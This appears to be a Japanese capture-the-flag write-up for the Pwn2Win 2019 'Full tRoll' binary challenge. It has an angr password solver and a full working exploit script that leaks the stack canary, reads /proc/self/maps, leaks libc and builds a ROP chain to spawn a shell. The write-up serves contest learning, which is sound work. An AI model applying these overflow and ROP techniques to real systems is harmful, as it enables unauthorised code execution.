# [pwn 223pts] Full tRoll - Pwn2Win 2019 CTF
64ビットバイナリで全部有効です。
```
$ checksec -f full_troll
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               3       full_troll
```
起動するとパスワードを聞かれます。IDAで調べるとパスワードは0x16文字より長く、`pass[0]^pass[1]==0x3f`のようなチェックで正しいか判断されます。最後の文字は`X`です。angrに解かせましょう。
```python
import angr

p = angr.Project("./full_troll", load_options={"auto_load_libs": False})
state = p.factory.entry_state()
simgr = p.factory.simulation_manager(state)
simgr.explore(find=0x400D3F, avoid=(0x400A79, 0x400D38))
try:
    found = simgr.found[0]
    print(found.posix.dumps(0))
except IndexError:
    print("Not Found")
```
パスワードは`VibEv7xCXyK8AjPPRjwtp9X`でした。secret.txtが開かれるのですが、調べたところこれはフラグではないようです。（それはそう。）
さて、BOFがあるので開くファイル名は変更できます。またエラーメッセージからBuffer OverreadによりCanaryなどをリークできます。
```
$ ./full_troll 
Welcome my friend. Tell me your password.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Incorrect!

Welcome my friend. Tell me your password.
VibEv7xCXyK8AjPPRjwtp9X
Unable to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA file!
Welcome my friend. Tell me your password.
```
やるだけやんと思ったのですが、printfで0x30バイトまでしか出力しないようになっているのでlibcのアドレス等は取れません。
任意のファイルが一行読めるのでmapsからproc baseを取ってきてROPしましょう。
```python
from ptrlib import *

password = 'VibEv7xCXyK8AjPPRjwtp9X'

libc = ELF("./libc.so.6")
elf = ELF("./full_troll")
sock = Process("./full_troll")

# leak canary
payload  = b'A' * 0x20 # password
payload += b'B' * 0x29 # filename + lsb of canary
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("Unable to open ")
canary = u64(b'\x00' + sock.recvline()[0x29:0x30])
logger.info('canary = ' + hex(canary))
assert canary > 0x100000000000000

# leak proc base
payload  = b'A' * 0x20
payload += b'/proc/self/maps\x00'
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
proc_base = int(sock.recvline()[:12], 16)
logger.info('proc = ' + hex(proc_base))

# leak libc base
payload  = b'A' * 0x20
payload += b'\x00' * 0x28
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(proc_base + 0x000010a3)
payload += p64(proc_base + elf.got('puts'))
payload += p64(proc_base + elf.plt('puts'))
payload += p64(proc_base + 0xead)
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("error")
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info('libc = ' + hex(libc_base))

# get the shell
payload  = b'A' * 0x20
payload += b'\x00' * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(proc_base + 0x000010a4)
payload += p64(proc_base + 0x000010a3)
payload += p64(libc_base + next(libc.find('/bin/sh\x00')))
payload += p64(libc_base + libc.symbol('system'))
assert b'\n' not in payload and b'\xff' not in payload
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("error")

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=11093)
[+] <module>: canary = 0xa1b849f691dd5b00
[+] <module>: proc = 0x55e0174cb000
[+] <module>: libc = 0x7f2fe20e9000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),136(kvm),999(docker)
[ptrlib]$
```

# 感想
ひと工夫必要で面白かったです。
